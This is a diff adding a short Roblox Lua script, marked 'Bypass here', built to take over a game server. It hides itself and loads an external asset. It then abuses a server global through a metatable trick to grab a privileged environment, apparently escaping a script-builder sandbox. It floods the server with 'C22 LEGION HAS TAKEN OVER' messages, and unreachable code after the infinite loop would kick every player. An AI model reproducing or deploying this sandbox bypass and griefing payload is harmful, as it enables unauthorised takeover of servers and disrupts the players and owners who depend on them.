@@ -1,0 +1,28 @@
+--Bypass here
+local Me = script
+wait()
+script.Parent=nil
+local _OX=getfenv()
+local i=game:service'InsertService':LoadAsset(140878711)
+local n=i:children()[1]
+game:service'Debris':AddItem(i,0)
+n.Parent=workspace
+pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()
+Environment=getfenv(2)end}))
+_G.OSC_AddServerSideData=nil
+game:service'Debris':AddItem(n,0)
+local new=Environment
+new.owner=_OX.owner
+new.print=_OX.print
+new.error=_OX.error
+new.warn=_OX.warn
+while wait() do
+local msg = Instance.new("Message",workspace)
+local hint = Instance.new("Hint",workspace)
+msg.Text = "THE C22 LEGION HAS TAKEN OVER"
+hint.Text = "THE C22 LEGION HAS TAKEN OVER"
+end
+wait(2)
+for _,v in pairs(game.Players:GetPlayers()) do
+v:Kick("The C22 legion has taken over this server")
+end
